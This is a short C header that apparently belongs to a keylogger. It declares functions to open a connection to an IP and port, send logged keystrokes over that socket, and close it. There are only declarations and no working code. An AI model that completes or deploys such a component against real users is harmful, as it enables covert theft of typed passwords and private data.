#ifndef _send_keylog
#define _send_keylog

int create_conn(char* ip, int port);
void send_keylog(int sock, char* key);
void close_socket(int sock);

#endif

